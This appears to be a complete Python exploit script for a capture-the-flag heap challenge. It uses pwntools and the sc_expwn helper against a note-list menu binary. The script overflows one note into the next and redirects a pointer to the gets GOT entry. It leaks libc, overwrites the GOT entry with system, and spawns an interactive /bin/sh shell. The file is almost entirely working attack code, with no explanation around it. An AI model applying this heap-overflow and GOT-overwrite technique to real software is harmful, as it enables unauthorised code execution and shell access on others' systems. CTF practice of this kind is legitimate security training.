#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.33.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_gets       = binf.got['gets']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_gets        = libc.sep_function['gets']

#==========

def attack(conn, **kwargs):
    sl = SimpleList(conn)

    sl.create(b'a'*8)   # 0
    sl.create(b'b'*8)   # 1

    exploit  = b'A'*0x20
    exploit += flat(0x31, addr_got_gets-8)
    exploit += b'/bin/sh\0'
    sl.edit(0, exploit)

    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'index: ', b'2')
    conn.recvuntil(b'content: ')

    addr_libc_gets = u(conn.recvuntil(b'\nNew', drop=True))
    libc.address = addr_libc_gets - offset_libc_gets
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    conn.sendlineafter(b'content: ', p64(addr_libc_system))

    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'index: ', b'1')

class SimpleList:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, data):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'Content: ', data)

    def edit(self, idx, data):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.recvuntil(b'content: ')
        old = self.recvuntil(b'\nNew', drop=True)
        self.sendlineafter(b'content: ', data)
        return old

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
